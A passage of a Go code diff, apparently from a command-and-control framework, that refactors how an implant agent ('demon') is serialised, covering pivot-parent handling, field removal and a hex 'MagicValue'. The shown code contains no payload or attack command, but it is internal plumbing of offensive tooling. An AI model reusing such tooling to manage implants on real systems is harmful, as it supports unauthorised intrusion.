+	ParentAgent = a.Pivots.Parent
 	a.Pivots.Parent = nil
 
-	InfoMap["Info"].(map[string]interface{})["Listener"] = nil
+	Info = structs.Map(a)
 
-	delete(InfoMap, "Connection")
-	delete(InfoMap, "SessionDir")
-	delete(InfoMap, "JobQueue")
-	delete(InfoMap, "Parent")
+	Info["Info"].(map[string]interface{})["Listener"] = nil
 
-	var TempMagic = fmt.Sprintf("%x", a.Info.MagicValue)
+	delete(Info, "Connection")
+	delete(Info, "SessionDir")
+	delete(Info, "JobQueue")
+	delete(Info, "Parent")
 
-	if TempParent != nil {
-		InfoMap["PivotParent"] = a.NameID
+	MagicValue = fmt.Sprintf("%x", a.Info.MagicValue)
+
+	if ParentAgent != nil {
+		Info["PivotParent"] = ParentAgent.NameID
+		a.Pivots.Parent = ParentAgent
 	}
 
-	InfoMap["MagicValue"] = TempMagic
+	Info["MagicValue"] = MagicValue
 
-	return InfoMap
+	return Info
 }
 
 func (a *Agent) ToJson() string {
@@ -1018,7 +1231,7 @@ func (a *Agent) ToJson() string {
 	return string(jsonBytes)
 }
 
-func (agents *Agents) AppendAgent(demon *Agent) []*Agent {
+func (agents *Agents) AgentsAppend(demon *Agent) []*Agent {
 	agents.Agents = append(agents.Agents, demon)
 	return agents.Agents
 }
